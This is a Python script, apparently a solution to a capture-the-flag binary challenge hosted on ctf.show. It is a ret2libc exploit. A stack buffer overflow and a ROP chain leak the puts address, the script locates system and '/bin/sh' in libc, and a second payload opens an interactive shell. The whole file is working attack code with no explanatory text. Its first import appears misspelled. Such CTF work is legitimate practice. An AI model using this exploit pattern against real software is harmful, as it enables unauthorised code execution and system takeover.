from pwn64 import *
from LibcSearcher import *

io = remote('pwn.challenge.ctf.show',28295)
#io=process("./pwn46")
elf = ELF('./pwn46')
# libc= ELF(elf.libc.path)

ret_add =0x00000000004004fe
pop_rdi =0x0000000000400803
main_add =0x000000000040073E
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0x70

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendlineafter(b'O.o?', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64

libc_base = puts_addr - libc.dump('puts')
system_add = libc_base + libc.dump('system')
bin_sh_add = libc_base + libc.dump('str_bin_sh')

# libc_base = puts_addr - libc.symbols['puts']
# system_add = libc_base + libc.symbols['system']
# bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'O.o?', payload2)

io.interactive()